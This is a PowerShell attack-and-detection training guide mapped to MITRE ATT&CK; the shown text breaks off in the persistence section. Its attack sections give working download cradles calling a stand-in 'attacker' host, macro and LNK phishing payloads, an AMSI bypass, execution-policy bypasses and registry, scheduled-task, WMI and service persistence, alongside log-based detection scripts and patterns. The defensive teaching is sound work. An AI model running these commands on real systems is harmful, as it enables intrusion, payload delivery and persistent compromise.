# PowerShell Attack & Detection Techniques

### Overview

PowerShell is a robust task automation framework built into Windows. Its deep system integration, .NET access, and remote execution capabilities make it an essential tool for both system administrators and attackers. This guide covers offensive techniques mapped to MITRE ATT\&CK tactics with comprehensive detection and defence strategies.

***

### Learning Workflow

**Phase 1: Foundations** — PowerShell internals, security controls, logging\
**Phase 2: Reconnaissance** — Network/AD enumeration, service discovery\
**Phase 3: Initial Access** — Download cradles, payload delivery, phishing\
**Phase 4: Execution** — Script execution, fileless attacks, AMSI bypass\
**Phase 5: Persistence** — Registry, scheduled tasks, WMI subscriptions\
**Phase 6: Privilege Escalation** — UAC bypass, token manipulation\
**Phase 7: Defence Evasion** — Obfuscation, logging bypass, AMSI evasion\
**Phase 8: Credential Access** — Mimikatz, SAM dumping, credential harvesting\
**Phase 9: Discovery** — System/network/AD enumeration\
**Phase 10: Lateral Movement** — PSRemoting, WMI, DCOM, SMB\
**Phase 11: Collection** — Data staging, clipboard, keylogging\
**Phase 12: Command & Control** — C2 frameworks, reverse shells\
**Phase 13: Exfiltration** — Data transfer, covert channels

***

## Phase 1: PowerShell Foundations

### PowerShell Versions & Locations

<table><thead><tr><th width="104">Version</th><th width="195">Windows Version</th><th>Key Features</th></tr></thead><tbody><tr><td>2.0</td><td>Win 7/2008 R2</td><td>Basic, often used for downgrade attacks</td></tr><tr><td>3.0</td><td>Win 8/2012</td><td>Workflows, scheduled jobs</td></tr><tr><td>4.0</td><td>Win 8.1/2012 R2</td><td>Desired State Configuration</td></tr><tr><td>5.0</td><td>Win 10/2016</td><td>Classes, Script Block Logging</td></tr><tr><td>5.1</td><td>Win 10/2016+</td><td>Latest Windows PowerShell</td></tr><tr><td>7.x</td><td>Cross-platform</td><td>PowerShell Core (pwsh.exe)</td></tr></tbody></table>

```powershell
# Check PowerShell version
$PSVersionTable.PSVersion
$host.Version

# PowerShell locations
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  # 64-bit
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  # 32-bit
C:\Program Files\PowerShell\7\pwsh.exe                      # PS Core

# Force specific version (downgrade attack)
powershell.exe -Version 2 -Command "Get-Host"
```

### Execution Policies

<table><thead><tr><th width="246">Policy</th><th>Description</th></tr></thead><tbody><tr><td><code>Restricted</code></td><td>No scripts allowed (default on clients)</td></tr><tr><td><code>AllSigned</code></td><td>Only signed scripts</td></tr><tr><td><code>RemoteSigned</code></td><td>Local scripts run; remote need signing</td></tr><tr><td><code>Unrestricted</code></td><td>All scripts run (warning for remote)</td></tr><tr><td><code>Bypass</code></td><td>Nothing blocked, no warnings</td></tr><tr><td><code>Undefined</code></td><td>Remove policy at this scope</td></tr></tbody></table>

```powershell
# Check execution policy
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Bypass execution policy (common attack patterns)
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -ep bypass -File script.ps1
powershell.exe -exec bypass -File script.ps1

# Other bypass methods
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

# Read and execute without policy restriction
Get-Content script.ps1 | powershell.exe -noprofile -
type script.ps1 | powershell.exe -noprofile -

# Encode and execute
$cmd = 'Get-Process'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

### Security Controls

#### AMSI (Antimalware Scan Interface)

```powershell
# AMSI scans PowerShell content in real-time
# Introduced in Windows 10/Server 2016

# Test AMSI
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
# Should trigger: "This script contains malicious content"

# Check AMSI status
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

#### Constrained Language Mode

```powershell
# Check language mode
$ExecutionContext.SessionState.LanguageMode

# Modes:
# - FullLanguage: All features available
# - ConstrainedLanguage: Limited .NET, no Add-Type
# - RestrictedLanguage: Very limited
# - NoLanguage: No scripts

# Force constrained mode (defence)
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
```

#### Script Block Logging

{% code overflow="wrap" %}
```powershell
# Check if enabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue

# Enable via GPO or registry
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```
{% endcode %}

#### Transcription Logging

{% code overflow="wrap" %}
```powershell
# Check transcription settings
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue

# Enable transcription
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\PSTranscripts"
```
{% endcode %}

### Important Event IDs

| Event ID | Log                    | Description          |
| -------- | ---------------------- | -------------------- |
| 4103     | PowerShell/Operational | Module logging       |
| 4104     | PowerShell/Operational | Script block logging |
| 4105     | PowerShell/Operational | Script block start   |
| 4106     | PowerShell/Operational | Script block stop    |
| 400      | Windows PowerShell     | Engine start         |
| 403      | Windows PowerShell     | Engine stop          |
| 500      | Windows PowerShell     | Command start        |
| 501      | Windows PowerShell     | Command stop         |
| 600      | Windows PowerShell     | Provider start       |
| 800      | Windows PowerShell     | Pipeline execution   |

{% code overflow="wrap" %}
```powershell
# Query PowerShell logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50
Get-WinEvent -LogName "Windows PowerShell" -MaxEvents 50

# Filter for script blocks
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 50
```
{% endcode %}

***

## Phase 2: Reconnaissance

### Attack Techniques

#### Network Reconnaissance

```powershell
# Port scanning
1..1024 | ForEach-Object { 
    $sock = New-Object System.Net.Sockets.TcpClient
    $async = $sock.BeginConnect("192.168.1.1", $_, $null, $null)
    $wait = $async.AsyncWaitHandle.WaitOne(100, $false)
    if($sock.Connected) { $_ }
    $sock.Close()
}

# Faster port scan
$ports = @(21,22,23,25,80,110,139,143,443,445,3389)
$target = "192.168.1.1"
$ports | ForEach-Object {
    (New-Object Net.Sockets.TcpClient).ConnectAsync($target, $_).Wait(100)
} 2>$null

# Network sweep
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip }
}

# ARP table
Get-NetNeighbor | Where-Object { $_.State -eq "Reachable" }
arp -a

# DNS enumeration
Resolve-DnsName -Name target.com -Type ANY
Resolve-DnsName -Name target.com -Type MX
[System.Net.Dns]::GetHostAddresses("target.com")
```

#### Active Directory Reconnaissance

{% code overflow="wrap" %}
```powershell
# Domain information
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
Get-ADDomain
Get-ADForest

# Domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
Get-ADDomainController -Filter *
nltest /dclist:domain.com

# User enumeration
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object SamAccountName, Name, Enabled

# Group enumeration
Get-ADGroup -Filter * | Select-Object Name
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Computer enumeration
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server*"'

# LDAP queries without AD module
$searcher = [adsisearcher]"(objectCategory=user)"
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# Find SPNs (Kerberoastable accounts)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Find ASREProastable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Trust enumeration
Get-ADTrust -Filter *
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```
{% endcode %}

#### Service Enumeration

{% code overflow="wrap" %}
```powershell
# SMB shares
Get-SmbShare
net share
Get-WmiObject -Class Win32_Share

# Remote shares
net view \\target
Get-SmbShare -CimSession (New-CimSession -ComputerName target)

# Running services
Get-Service | Where-Object { $_.Status -eq "Running" }
Get-WmiObject -Class Win32_Service | Select-Object Name, StartMode, State, PathName

# Scheduled tasks
Get-ScheduledTask | Where-Object { $_.State -eq "Ready" }
schtasks /query /fo LIST /v

# Installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
```
{% endcode %}

### Detection Strategies

#### Log Analysis

{% code overflow="wrap" %}
```powershell
# Look for enumeration commands in script block logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} | 
    Where-Object { $_.Message -match 'Get-ADUser|Get-ADComputer|Get-ADGroup|Test-Connection|TcpClient' }

# LDAP queries
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4662} | 
    Where-Object { $_.Message -match 'Directory Service Access' }

# Mass enumeration indicators
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object { $_.Message -match 'Filter \*|ForEach|1\.\.254' }
```
{% endcode %}

#### Network Detection

```powershell
# High volume DNS queries
Get-DnsClientCache | Group-Object Name | Sort-Object Count -Descending

# Connection attempts
Get-NetTCPConnection | Where-Object { $_.State -eq "SynSent" }

# Failed connections (potential scanning)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5157}
```

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Reconnaissance Detection Script
Write-Host "=== PowerShell Reconnaissance Detection ===" -ForegroundColor Yellow

# Recent enumeration commands
Write-Host "`n[1] Recent AD Enumeration:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 100 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Get-AD|ADSI|DirectorySearcher|LDAP' } |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Message.Substring(0,200)}}

# Port scanning indicators
Write-Host "`n[2] Network Scanning Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 100 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'TcpClient|Test-Connection|1\.\.254|1\.\.1024' } |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Message.Substring(0,200)}}

# Service enumeration
Write-Host "`n[3] Service Enumeration:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 100 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Get-Service|Get-WmiObject.*Win32_Service|Get-SmbShare' } |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Message.Substring(0,200)}}
```
{% endcode %}

***

## Phase 3: Initial Access

### Attack Techniques

#### Download Cradles

{% code overflow="wrap" %}
```powershell
# Basic download and execute (IEX = Invoke-Expression)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
IEX (iwr 'http://attacker/payload.ps1' -UseBasicParsing)

# Invoke-WebRequest variations
Invoke-WebRequest -Uri 'http://attacker/payload.ps1' -OutFile 'C:\temp\p.ps1'
iwr 'http://attacker/payload.ps1' -o 'C:\temp\p.ps1'

# WebClient methods
(New-Object Net.WebClient).DownloadFile('http://attacker/malware.exe', 'C:\temp\m.exe')
(New-Object Net.WebClient).DownloadData('http://attacker/shellcode.bin')

# Invoke-RestMethod
Invoke-RestMethod -Uri 'http://attacker/payload.ps1' | IEX
irm 'http://attacker/payload.ps1' | IEX

# Using .NET classes directly
[System.Net.WebRequest]::Create('http://attacker/payload.ps1').GetResponse()
$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://attacker/payload.ps1') | IEX

# Using COM objects
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Navigate('http://attacker/payload.ps1')

# BITS transfer
Start-BitsTransfer -Source 'http://attacker/payload.exe' -Destination 'C:\temp\p.exe'
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\temp\p.exe

# Certutil (not PowerShell but commonly used)
certutil -urlcache -split -f http://attacker/payload.exe C:\temp\p.exe
```
{% endcode %}

#### Encoded Commands

{% code overflow="wrap" %}
```powershell
# Create encoded command
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://attacker/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
# Execute: powershell.exe -EncodedCommand $encoded

# Decode for analysis
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))

# Compressed and encoded
$cmd = 'Get-Process'
$ms = New-Object IO.MemoryStream
$cs = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Compress)
$sw = New-Object IO.StreamWriter($cs)
$sw.Write($cmd)
$sw.Close()
$compressed = [Convert]::ToBase64String($ms.ToArray())
```
{% endcode %}

#### File Download Methods

{% code overflow="wrap" %}
```powershell
# PowerShell 3.0+
Invoke-WebRequest -Uri "http://attacker/file.exe" -OutFile "C:\temp\file.exe"

# Background download
Start-Job { Invoke-WebRequest -Uri "http://attacker/file.exe" -OutFile "C:\temp\file.exe" }

# Using .NET HttpClient
$client = New-Object System.Net.Http.HttpClient
$response = $client.GetAsync('http://attacker/file.exe').Result
[IO.File]::WriteAllBytes('C:\temp\file.exe', $response.Content.ReadAsByteArrayAsync().Result)

# FTP download
$ftp = [System.Net.FtpWebRequest]::Create('ftp://attacker/file.exe')
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile
$response = $ftp.GetResponse()

# SMB download (no internet required)
Copy-Item \\attacker\share\payload.exe C:\temp\payload.exe
```
{% endcode %}

#### Phishing Payloads

{% code overflow="wrap" %}
```powershell
# Macro payload (VBA calls PowerShell)
# Sub AutoOpen()
#     Shell "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
# End Sub

# HTA payload
# <script language="VBScript">
# Set shell = CreateObject("WScript.Shell")
# shell.Run "powershell -ep bypass -w hidden -c IEX(...)"
# </script>

# LNK file payload
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("C:\temp\malicious.lnk")
$shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = "-ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,3"
$shortcut.Save()
```
{% endcode %}

### Detection Strategies

#### Log Indicators

{% code overflow="wrap" %}
```powershell
# Download cradle detection
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object { $_.Message -match 'DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|WebClient|BitsTransfer|Net\.Http' }

# Encoded command execution
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object { $_.Message -match 'EncodedCommand|FromBase64String|-enc|-e ' }

# Process creation with suspicious arguments
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |
    Where-Object { $_.Message -match 'powershell.*-enc|-ep bypass|-executionpolicy bypass|-w hidden|-windowstyle hidden' }
```
{% endcode %}

#### Network Detection

{% code overflow="wrap" %}
```powershell
# Recent web requests
Get-NetTCPConnection | Where-Object { $_.RemotePort -eq 80 -or $_.RemotePort -eq 443 }

# DNS cache for suspicious domains
Get-DnsClientCache | Where-Object { $_.Name -match '\d+\.\d+\.\d+\.\d+|raw\.githubusercontent|pastebin' }

# Proxy logs analysis (if available)
# Look for: .ps1 downloads, raw code hosts, unusual domains
```
{% endcode %}

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Initial Access Detection Script
Write-Host "=== PowerShell Initial Access Detection ===" -ForegroundColor Yellow

# Download cradles
Write-Host "`n[1] Download Cradle Detection:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 500 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'DownloadString|DownloadFile|Invoke-WebRequest|Net\.WebClient|WebRequest|BitsTransfer|irm |iwr ' } |
    Select-Object TimeCreated, @{N='Command';E={($_.Message -split "`n")[0]}} | 
    Format-Table -AutoSize

# Encoded commands
Write-Host "`n[2] Encoded Command Detection:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 500 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'FromBase64String|ToBase64String|EncodedCommand' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Hidden window execution
Write-Host "`n[3] Hidden Execution Detection:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 500 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'powershell.*(-w hidden|-windowstyle hidden|-ep bypass)' } |
    Select-Object TimeCreated, @{N='CommandLine';E={($_.Message -split "Process Command Line:")[1]}} |
    Format-Table -AutoSize

# BITS transfers
Write-Host "`n[4] BITS Transfer Detection:" -ForegroundColor Cyan
Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue | Select-Object DisplayName, TransferType, JobState, BytesTotal
```
{% endcode %}

### Defensive Measures

{% code overflow="wrap" %}
```powershell
# Block PowerShell download cradles with AppLocker
# Or use WDAC (Windows Defender Application Control)

# Enable PowerShell logging (GPO recommended)
# Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell

# Block encoded commands (careful - may break legitimate scripts)
# Audit first, then block

# Web proxy rules
# Block: *.githubusercontent.com, pastebin.com, etc. or inspect PowerShell traffic
```
{% endcode %}

***

## Phase 4: Execution

### Attack Techniques

#### Script Execution Methods

{% code overflow="wrap" %}
```powershell
# Direct execution
.\script.ps1
& "C:\temp\script.ps1"
Invoke-Expression (Get-Content script.ps1 -Raw)

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -f script.ps1

# In-memory execution (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')

# Using Invoke-Command
Invoke-Command -ScriptBlock { Get-Process }
Invoke-Command -FilePath script.ps1 -ComputerName localhost

# Using Start-Process
Start-Process powershell.exe -ArgumentList "-ep bypass -f script.ps1"

# Background execution
Start-Job -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1') }
```
{% endcode %}

#### Fileless Execution

```powershell
# Memory-only payload
$code = (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
IEX $code

# Reflection loading (load .NET assembly in memory)
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker/payload.dll')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.GetType('Namespace.Class').GetMethod('Method').Invoke($null, @())

# PowerShell runspace
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$pipeline = $rs.CreatePipeline()
$pipeline.Commands.AddScript('Get-Process')
$pipeline.Invoke()

# Using Add-Type for C# execution
Add-Type -TypeDefinition @"
public class Payload {
    public static void Execute() {
        System.Diagnostics.Process.Start("calc.exe");
    }
}
"@
[Payload]::Execute()
```

#### Alternative Execution Hosts

{% code overflow="wrap" %}
```powershell
# PowerShell ISE
powershell_ise.exe -File script.ps1

# System.Management.Automation.dll
# Can be loaded by any .NET application

# PowerShell via .NET
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# PowerShell via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -ep bypass -c Get-Process"

# PowerShell via Task Scheduler
schtasks /create /tn "Task" /tr "powershell.exe -ep bypass -f C:\script.ps1" /sc once /st 00:00
```
{% endcode %}

#### AMSI Bypass Techniques

```powershell
# Note: These are for educational purposes - AV may flag them

# Reflection-based (commonly detected)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative bypass methods exist but change frequently
# Modern AV/EDR will detect and block these
```

### Detection Strategies

#### Log Analysis

{% code overflow="wrap" %}
```powershell
# Script block logging - all executed code
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104}

# Warning level script blocks (suspicious)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;Level=3}

# AMSI events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'} |
    Where-Object { $_.Message -match 'AMSI' }

# Process creation events
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |
    Where-Object { $_.Message -match 'powershell|pwsh' }
```
{% endcode %}

#### Process Detection

```powershell
# PowerShell processes with suspicious arguments
Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" | 
    Select-Object ProcessId, CommandLine

# PowerShell with network connections
Get-NetTCPConnection | Where-Object {
    $_.OwningProcess -in (Get-Process -Name powershell*).Id
}

# Encoded command detection in running processes
Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match '-enc|-e ' }
```

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Execution Detection Script
Write-Host "=== PowerShell Execution Detection ===" -ForegroundColor Yellow

# Running PowerShell processes
Write-Host "`n[1] Active PowerShell Processes:" -ForegroundColor Cyan
Get-WmiObject Win32_Process -Filter "Name='powershell.exe' OR Name='pwsh.exe'" |
    Select-Object ProcessId, @{N='CommandLine';E={$_.CommandLine.Substring(0,[Math]::Min(200,$_.CommandLine.Length))}}

# Script block logging events (last hour)
Write-Host "`n[2] Recent Script Blocks (Warning Level):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;Level=3;StartTime=(Get-Date).AddHours(-1)} -MaxEvents 20 -ErrorAction SilentlyContinue |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Message.Substring(0,300)}}

# IEX/Invoke-Expression usage
Write-Host "`n[3] Invoke-Expression Usage:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Invoke-Expression|IEX |iex\(' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# AMSI bypass attempts
Write-Host "`n[4] AMSI Bypass Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'AmsiUtils|amsiInitFailed|AmsiScanBuffer' } |
    Select-Object TimeCreated | Format-Table -AutoSize
```
{% endcode %}

***

## Phase 5: Persistence

### Attack Techniques

#### Registry Persistence

{% code overflow="wrap" %}
```powershell
# Run keys (current user)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe -ep bypass -w hidden -c IEX(...)"

# Run keys (all users - requires admin)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe -ep bypass -w hidden -c IEX(...)"

# RunOnce keys
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "Updater" -Value "powershell.exe ..."

# Winlogon
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe, powershell.exe -ep bypass ..."

# AppInit_DLLs (deprecated but works)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\path\to\malicious.dll"

# Image File Execution Options (debugger)
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "Debugger" -Value "powershell.exe -ep bypass -c ..."
```
{% endcode %}

#### Scheduled Tasks

{% code overflow="wrap" %}
```powershell
# Create scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1'))"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest

# Using schtasks
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -ep bypass -f C:\temp\payload.ps1" /sc onlogon /ru SYSTEM

# Daily task
$trigger = New-ScheduledTaskTrigger -Daily -At "09:00"
Register-ScheduledTask -TaskName "DailyTask" -Action $action -Trigger $trigger

# On idle
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Hours 1) -RunOnlyIfIdle
```
{% endcode %}

#### WMI Event Subscriptions

{% code overflow="wrap" %}
```powershell
# Permanent WMI subscription (survives reboot)
$filterName = "WindowsUpdate"
$consumerName = "WindowsUpdateConsumer"

# Create filter (event trigger)
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=8 AND TargetInstance.Minute=0"
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = $query
}

# Create consumer (action)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c IEX(...)"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```
{% endcode %}

#### Service Persistence

{% code overflow="wrap" %}
```powershell
# Create malicious service
New-Service -Name "WindowsUpdateSvc" -BinaryPathName "powershell.exe -ep bypass -w hidden -c IEX(...)" -DisplayName "Windows Update Service" -StartupType Automatic

# Using sc.exe
sc.exe create WindowsUpdateSvc binPath= "powershell.exe -ep bypass -w hidden -c IEX(...)" start= auto

# Modify existing service
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ExistingService" -Name "ImagePath" -Value "powershell.exe ..."
```
{% endcode %}

#### Startup Folder

{% code overflow="wrap" %}
```powershell
# User startup
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.bat"
Set-Content -Path $path -Value "powershell.exe -ep bypass -w hidden -c IEX(...)"

# All users startup (requires admin)
$path = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.bat"
Set-Content -Path $path -Value "powershell.exe -ep bypass -w hidden -c IEX(...)"

# LNK in startup
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk")
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-ep bypass -w hidden -c IEX(...)"
$shortcut.Save()
```
{% endcode %}

### Detection Strategies

#### Registry Monitoring

{% code overflow="wrap" %}
```powershell
# Check Run keys
$runKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($key in $runKeys) {
    Write-Host "`n$key" -ForegroundColor Yellow
    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
}

# Check for PowerShell in run keys
foreach ($key in $runKeys) {
    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | 
        ForEach-Object { $_.PSObject.Properties } | 
        Where-Object { $_.Value -match 'powershell|pwsh' }
}

# Image File Execution Options
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" |
    Where-Object { (Get-ItemProperty $_.PSPath).Debugger }
```
{% endcode %}

#### Scheduled Task Monitoring

{% code overflow="wrap" %}
```powershell
# List all tasks with PowerShell actions
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $actions = $task | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
    $task.Actions | Where-Object { $_.Execute -match 'powershell|pwsh' } |
        ForEach-Object { [PSCustomObject]@{TaskName=$task.TaskName; Action=$_.Execute; Arguments=$_.Arguments} }
}

# Recently created tasks
Get-ScheduledTask | Where-Object { $_.Date -gt (Get-Date).AddDays(-7) }
```
{% endcode %}

#### WMI Subscription Detection

```powershell
